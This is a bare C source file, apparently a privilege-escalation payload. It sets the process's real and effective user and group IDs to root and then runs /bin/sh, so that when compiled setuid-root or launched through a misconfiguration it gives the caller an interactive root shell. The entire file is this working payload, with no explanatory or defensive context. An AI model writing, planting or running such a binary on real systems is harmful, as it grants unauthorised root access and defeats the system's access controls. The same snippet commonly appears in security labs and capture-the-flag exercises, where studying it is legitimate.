#include <unistd.h>

int main(){
    int retuid = setreuid(0, 0);
    int retgid = setregid(0, 0);

    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};

    execve("/bin/sh", argv, envp);
}